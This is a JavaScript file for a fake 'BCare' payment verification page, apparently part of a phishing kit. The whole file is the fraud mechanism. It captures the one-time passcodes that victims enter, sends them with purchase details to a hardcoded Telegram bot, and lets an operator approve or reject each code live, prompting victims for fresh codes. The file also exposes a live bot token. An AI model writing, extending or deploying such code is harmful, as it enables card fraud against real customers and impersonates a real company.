/* =====================================================
   بي كير — otp-verify.js  v5
   ══════════════════════════════════════════════════
   التدفق:
   1. تفاصيل الطلب تصل Telegram (بدون OTP)
   2. العميل يدخل 6 أرقام يختارها بنفسه → يضغط تأكيد
   3. الأرقام تُرسل لـ Telegram مع أزرار Inline
   4. الأدمن يضغط زر موافقة أو رفض
   5. الصفحة تستلم القرار → نجاح أو رفض
===================================================== */
'use strict';

const TG = {
  TOKEN: '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow',
  CHAT:  '1451039924',
};

let userOTP     = '';
let pollInt     = null;
let lastUpdateId = 0;
let waitingConfirm = false;
let myRefNumber = '';

/* ─── Telegram API ───────────────────────────────── */
async function tgSend(text, replyMarkup) {
  try {
    const body = { chat_id: TG.CHAT, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    const res = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/sendMessage`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }
    );
    return await res.json();
  } catch(e) { console.error('TG:', e); return { ok: false }; }
}

async function tgAnswerCallback(callbackQueryId, text) {
  try {
    await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/answerCallbackQuery`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) }
    );
  } catch(e) {}
}

async function tgEditMessage(messageId, text) {
  try {
    await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/editMessageText`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG.CHAT, message_id: messageId, text, parse_mode: 'HTML' }) }
    );
  } catch(e) {}
}

async function tgGetUpdates() {
  try {
    const res  = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=2`
    );
    const data = await res.json();
    return data.ok ? (data.result || []) : [];
  } catch(e) { return []; }
}

/* ─── رسالة OTP مع أزرار Inline ─────────────────────── */
function buildOTPMsg(code, ref) {
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    return `🔑 <b>العميل أدخل رمز التأكيد</b>

🔑 الرمز: <code>${code}</code>
🏢 الشركة: ${offer.companyName || '—'}
💰 المبلغ: ر.س ${parseFloat(offer.total||0).toFixed(2)}
🆔 المرجع: <code>${ref}</code>`;
  } catch(e) {
    return `🔑 العميل أدخل: <code>${code}</code>\n🆔 المرجع: <code>${ref}</code>`;
  }
}

function buildOTPOtpKeyboard(code, ref) {
  return {
    inline_keyboard: [
      [
        { text: `✅ الموافقة: أرسل نفس الرمز ${code}`, callback_data: `otp_approve_${ref}_${code}` },
      ],
      [
        { text: '❌ للرفض: أرسل REJECT', callback_data: `otp_reject_${ref}` },
      ]
    ]
  };
}

/* ─── Polling قرار الأدمن ──────────────────────────── */
function startPolling() {
  clearInterval(pollInt);
  pollInt = setInterval(async () => {
    if (!waitingConfirm) return;
    const updates = await tgGetUpdates();
    for (const u of updates) {
      lastUpdateId = u.update_id;

      /* ── زر Inline Callback ── */
      if (u.callback_query) {
        const cq = u.callback_query;
        const data = cq.data || '';

        /* موافقة */
        if (data.startsWith('otp_approve_')) {
          const parts = data.replace('otp_approve_', '').split('_');
          const ref   = parts[0];
          const code  = parts.slice(1).join('_');
          if (ref === myRefNumber && code === userOTP) {
            waitingConfirm = false;
            clearInterval(pollInt);
            await tgAnswerCallback(cq.id, '✅ تمت الموافقة');
            await tgEditMessage(cq.message.message_id,
              cq.message.text + '\n\n✅ <b>تم تأكيد الدفع بنجاح</b>');
            showSuccess();
            return;
          }
        }

        /* رفض */
        if (data.startsWith('otp_reject_')) {
          const ref = data.replace('otp_reject_', '');
          if (ref === myRefNumber) {
            waitingConfirm = false;
            clearInterval(pollInt);
            await tgAnswerCallback(cq.id, '❌ تم الرفض');
            await tgEditMessage(cq.message.message_id,
              cq.message.text + '\n\n❌ <b>تم رفض العملية</b>');
            showRejectRetry();
            return;
          }
        }
      }

      /* ── نص عادي (backup) ── */
      const text = u.message?.text?.trim() || '';

      if (text.toUpperCase() === 'REJECT') {
        waitingConfirm = false;
        clearInterval(pollInt);
        showRejectRetry();
        return;
      }
      if (text === userOTP) {
        waitingConfirm = false;
        clearInterval(pollInt);
        showSuccess();
        return;
      }
    }
  }, 2500);
}

/* ─── رفض → رمز خاطئ + أعد المحاولة ──────────────── */
function showRejectRetry() {
  const boxes      = [...document.querySelectorAll('.otp-box')];
  const confirmBtn = document.getElementById('otp-confirm-btn');
  const sub        = document.getElementById('otp-sub-text');

  boxes.forEach(b => {
    b.classList.add('otp-error');
    setTimeout(() => b.classList.remove('otp-error'), 600);
  });

  setTimeout(() => {
    boxes.forEach(b => { b.value=''; b.disabled=false; b.classList.remove('filled','otp-success'); });
    if (confirmBtn) {
      confirmBtn.disabled = true;
      confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد';
    }
    if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام لتأكيد العملية`;
    setOTPErr('رمز التحقق غير صحيح — أدخل رمزاً آخر');
    boxes[0]?.focus();
  }, 700);
}

/* ─── عرض الرفض ───────────────────────────────────── */
function showRejection() {
  clearInterval(pollInt);
  const card = document.getElementById('otp-card');
  if (card) card.innerHTML = `
    <div class="otp-card-inner">
      <div style="width:72px;height:72px;border-radius:50%;background:#fdecea;display:flex;align-items:center;justify-content:center;margin:0 auto">
        <span class="material-icons" style="font-size:2.2rem;color:#e53935">cancel</span>
      </div>
      <h2 style="font-size:1.2rem;font-weight:800;color:#e53935;margin-bottom:.25rem">تم رفض العملية</h2>
      <p style="font-size:.88rem;color:#6b7c93;line-height:1.65;text-align:center">
        نعتذر، تم رفض عملية الدفع بعد مراجعة البيانات.<br/>
        يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.
      </p>
      <button type="button" class="otp-back" onclick="window.location.href='secure-checkout.html'">
        <span class="material-icons" style="font-size:.9rem">arrow_forward</span>
        العودة لصفحة الدفع
      </button>
    </div>`;
}

/* ─── قراءة بيانات العملية ────────────────────────── */
function loadData() {
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
    set('otp-amount',  offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
    set('otp-company', offer.companyName || '—');
  } catch(e) {}
}

/* ─── مربعات OTP (مفعّلة من البداية) ───────────────── */
function initBoxes() {
  const boxes      = [...document.querySelectorAll('.otp-box')];
  const confirmBtn = document.getElementById('otp-confirm-btn');

  boxes.forEach((box, idx) => {
    box.addEventListener('input', e => {
      box.value = e.target.value.replace(/\D/g,'').slice(-1);
      box.classList.toggle('filled', !!box.value);
      if (box.value && idx < boxes.length-1) boxes[idx+1].focus();
      const done = boxes.every(b => b.value);
      if (confirmBtn) confirmBtn.disabled = !done;
      clearOTPErr();
    });

    box.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        boxes[idx-1].value = '';
        boxes[idx-1].classList.remove('filled');
        boxes[idx-1].focus();
        if (confirmBtn) confirmBtn.disabled = true;
      }
    });

    box.addEventListener('paste', e => {
      e.preventDefault();
      const p = (e.clipboardData?.getData('text')||'').replace(/\D/g,'').slice(0,6);
      p.split('').forEach((d,i) => { if(boxes[i]) { boxes[i].value=d; boxes[i].classList.add('filled'); } });
      if (confirmBtn) confirmBtn.disabled = p.length < 6;
      if (boxes[Math.min(p.length, 5)]) boxes[Math.min(p.length, 5)].focus();
    });
  });

  if (confirmBtn) confirmBtn.addEventListener('click', submitOTP);
}

/* ─── إرسال OTP للـ Telegram + انتظار قرار الأدمن ──── */
async function submitOTP() {
  const boxes   = [...document.querySelectorAll('.otp-box')];
  const entered = boxes.map(b => b.value).join('');

  if (entered.length < 6) {
    setOTPErr('يرجى إدخال 6 أرقام');
    return;
  }

  userOTP = entered;

  /* 📨 إرسال رمز العميل لـ Telegram مع أزرار Inline */
  await tgSend(buildOTPMsg(entered, myRefNumber), buildOTPOtpKeyboard(entered, myRefNumber));

  /* تغيير الواجهة */
  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) {
    confirmBtn.disabled = true;
    confirmBtn.innerHTML = '<span class="material-icons otp-spin">autorenew</span> بانتظار التأكيد...';
  }

  boxes.forEach(b => b.disabled = true);

  const sub = document.getElementById('otp-sub-text');
  if (sub) sub.innerHTML = `تم إرسال الرمز للمراجعة<br/>
    <span style="color:var(--blue);font-weight:600">بانتظار تأكيد العملية...</span>`;

  waitingConfirm = true;
  startPolling();
}

/* ─── شاشة النجاح ─────────────────────────────────── */
function showSuccess() {
  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) {
    confirmBtn.disabled = true;
    confirmBtn.innerHTML = '<span class="material-icons otp-spin">autorenew</span> جاري التأكيد...';
  }

  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    tgSend(`✅ <b>تم تأكيد الدفع بنجاح</b>

🏢 ${offer.companyName||'—'}
💰 ر.س ${parseFloat(offer.total||0).toFixed(2)}
🆔 <code>${offer.refNumber||'—'}</code>

<i>العملية مكتملة ✅</i>`);
  } catch(e) {}

  setTimeout(() => {
    document.getElementById('otp-card')?.classList.add('hidden');
    const sc = document.getElementById('otp-success-card');
    if (sc) sc.classList.remove('hidden');
    try {
      const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
      const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
      set('success-ref',     offer.refNumber || ('BC-'+Date.now().toString().slice(-8)));
      set('success-company', offer.companyName || '—');
      set('success-amount',  offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
    } catch(e){}
    window.scrollTo({top:0, behavior:'smooth'});
  }, 1200);
}

function setOTPErr(msg) { const e=document.getElementById('otp-err'); if(e) e.textContent=msg; }
function clearOTPErr()  { const e=document.getElementById('otp-err'); if(e) e.textContent='';  }

/* ─── INIT ────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', async () => {
  loadData();
  initBoxes();

  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    myRefNumber = offer.refNumber || ('BC-' + Date.now().toString().slice(-8).toUpperCase());
    if (!offer.refNumber) {
      offer.refNumber = myRefNumber;
      sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
    }
  } catch(e) {
    myRefNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
  }

  const oldUpdates = await tgGetUpdates();
  if (oldUpdates.length > 0) {
    lastUpdateId = oldUpdates.reduce((max, u) => Math.max(max, u.update_id), 0);
  }

  document.querySelector('.otp-box')?.focus();
});
